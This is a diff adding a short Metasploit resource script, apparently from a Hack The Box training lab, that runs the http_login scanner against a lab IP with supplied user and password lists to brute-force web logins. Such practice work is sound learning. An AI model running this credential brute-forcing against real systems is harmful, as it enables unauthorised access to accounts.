@@ -1,0 +1,9 @@
+use auxiliary/scanner/http/http_login
+set RHOSTS 10.129.1.15
+set RPORT 80
+set USER_FILE /home/angel/Documents/HTB/startingPoint/Tier-1/Crocodile-2/content/allowed.userlist
+set USERPASS_FILE /home/angel/Documents/HTB/startingPoint/Tier-1/Crocodile-2/content/allowed.userlist.passwd
+
+run
+
+
